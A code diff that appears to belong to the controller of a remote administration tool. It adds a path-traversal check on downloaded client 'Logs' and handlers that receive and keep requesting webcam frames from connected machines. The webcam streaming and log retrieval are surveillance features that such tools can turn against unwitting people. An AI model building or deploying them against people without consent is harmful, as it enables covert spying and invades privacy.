@@ -1,6 +1,7 @@
 using System;
 using System.IO;
 using System.Linq;
+using System.Drawing;
 using System.Threading;
 using xServer.Core.Data;
 using xServer.Core.Helper;
@@ -120,6 +121,14 @@ namespace xServer.Core.Commands
             if (string.IsNullOrEmpty(packet.Filename))
                 return;
 
+            // don't escape from download directory
+            if (FileHelper.CheckPathForIllegalChars(packet.Filename))
+            {
+                // disconnect malicious client
+                client.Disconnect();
+                return;
+            }
+
             string downloadPath = Path.Combine(client.Value.DownloadDirectory, "Logs\\");
 
             if (!Directory.Exists(downloadPath))
@@ -171,6 +180,36 @@ namespace xServer.Core.Commands
                 return;
 
             client.Value.FrmRdp.AddMonitors(packet.Number);
+        }
+
+        public static void HandleGetWebcamsResponse(Client client, GetWebcamsResponse packet)
+        {
+            if (client.Value == null || client.Value.FrmWebcam == null)
+                return;
+
+            client.Value.FrmWebcam.AddWebcams(packet.Webcams);
+        }
+
+        public static void HandleGetWebcamResponse(Client client, GetWebcamResponse packet)
+        {
+            if (client.Value == null ||  client.Value.FrmWebcam == null
+                || client.Value.FrmWebcam.IsDisposed
+                || client.Value.FrmWebcam.Disposing)
+                return;
+
+            if (packet.Image == null)
+                return;
+
+            using (MemoryStream ms = new MemoryStream(packet.Image))
+            {
+                Bitmap img = new Bitmap(ms);
+                client.Value.FrmWebcam.UpdateImage(img);
+            }
+
+            if (client.Value != null && client.Value.FrmWebcam != null && client.Value.FrmWebcam.IsStarted)
+            {
+                new GetWebcam(packet.Webcam, packet.Resolution).Execute(client);
+            }
         }
     }
 }
